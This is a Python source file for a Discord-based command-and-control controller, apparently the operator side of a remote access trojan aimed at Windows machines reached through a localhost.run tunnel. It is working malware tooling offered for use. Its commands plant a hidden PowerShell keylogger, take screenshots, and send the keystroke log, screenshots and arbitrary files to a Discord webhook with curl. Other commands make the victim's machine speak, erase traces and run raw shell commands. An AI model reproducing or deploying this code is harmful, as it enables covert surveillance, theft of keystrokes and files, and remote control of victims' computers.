import discord
import requests
import threading
import time
import urllib.parse

# --- CONFIGURATION ---

#replace with your own 
TOKEN = ''
MY_TOKEN = ""
WEBHOOK_URL = "" 

CURRENT_BRIDGE_URL = ""

client = discord.Client(intents=discord.Intents.all())

@client.event
async def on_ready():
    print(f'\n[!] Controller Online: {client.user}')
    print('[!] COMMANDS: s, n, l, i, p, h, v, o, w, g, x')
    print('[!] TYPE "set" TO MANUALLY ADD BRIDGE URL')

@client.event
async def on_message(message):
    global CURRENT_BRIDGE_URL
    if "lhr.life" in message.content or "localhost.run" in message.content:
        for word in message.content.split():
            if "lhr.life" in word or "localhost.run" in word:
                url = word.strip().strip('`').split('?')[0].rstrip('/')
                if not url.startswith("http"): url = "https://" + url
                CURRENT_BRIDGE_URL = f"{url}/{MY_TOKEN}/exec?cmd="
                print(f"\n[+] DISCORD AUTO-LOCKED: {CURRENT_BRIDGE_URL}")

def manual_console():
    global CURRENT_BRIDGE_URL
    while True:
        # If no bridge is set, we only allow the "set" command
        if not CURRENT_BRIDGE_URL:
            print("\r[?] Waiting for bridge... (Type 'set' to add manually)", end="")
            cmd = input("").strip().lower()
        else:
            cmd = input(f"\n({CURRENT_BRIDGE_URL[:20]}...) >> ").strip().lower()

        # --- NEW: MANUAL SET OPTION ---
        if cmd == "set":
            manual_url = input("Paste Bridge URL (e.g. https://xyz.lhr.life): ").strip().rstrip('/')
            if not manual_url.startswith("http"): manual_url = "https://" + manual_url
            CURRENT_BRIDGE_URL = f"{manual_url}/{MY_TOKEN}/exec?cmd="
            print(f"[+] MANUAL LOCK: {CURRENT_BRIDGE_URL}")
            continue

        if not CURRENT_BRIDGE_URL:
            continue

        # --- s, n, l, i, p, h, v, o, w (EXISTING) ---
        if cmd == "s":
            cap = "powershell -c \"Add-Type -AssemblyName System.Windows.Forms;$b=[Windows.Forms.Screen]::PrimaryScreen.Bounds;$i=New-Object Drawing.Bitmap($b.Width,$b.Height);$g=[Drawing.Graphics]::FromImage($i);$g.CopyFromScreen(0,0,0,0,$b.Size);$i.Save('C:/Users/Public/s.jpg',[Drawing.Imaging.ImageFormat]::Jpeg)\""
            requests.get(f"{CURRENT_BRIDGE_URL}{urllib.parse.quote(cap)}")
            time.sleep(2)
            requests.get(f"{CURRENT_BRIDGE_URL}curl -F file=@C:/Users/Public/s.jpg {WEBHOOK_URL}")
        
        elif cmd == "l":
            requests.get(f"{CURRENT_BRIDGE_URL}curl -F file=@C:/Users/Public/k.txt {WEBHOOK_URL}")
            
        elif cmd == "i":
            mini_i = "powershell -w hidden -c \"sps -WindowStyle Hidden powershell '$s=[Microsoft.VisualBasic.Interaction];while(1){for($i=8;$i -le 190;$i++){if([user32]::GetAsyncKeyState($i) -eq -32767){[io.file]::AppendAllText(\"\"C:/Users/Public/k.txt\"\",[char]$i)}};sleep -m 100}'\""
            requests.get(f"{CURRENT_BRIDGE_URL}{urllib.parse.quote(mini_i)}")

        elif cmd == "v":
            msg = input("Message: ")
            requests.get(f"{CURRENT_BRIDGE_URL}powershell -c \"Add-Type -AssemblyName System.Speech; $s=New-Object System.Speech.Synthesis.SpeechSynthesizer; $s.Speak('{msg}')\"")

        elif cmd == "g":
            path = input("File Path: ").strip()
            requests.get(f"{CURRENT_BRIDGE_URL}curl -F file=@{path} {WEBHOOK_URL}")

        elif cmd == "x":
            kill_cmd = "powershell -c \"Stop-Process -Name powershell -Force; rm C:/Users/Public/*.txt; rm C:/Users/Public/*.jpg\""
            requests.get(f"{CURRENT_BRIDGE_URL}{urllib.parse.quote(kill_cmd)}")
            print("[+] Target Cleaned.")
            
        else:
            # Allow raw CMD commands
            requests.get(f"{CURRENT_BRIDGE_URL}{urllib.parse.quote(cmd)}")

if __name__ == "__main__":
    threading.Thread(target=manual_console, daemon=True).start()
    client.run(TOKEN)
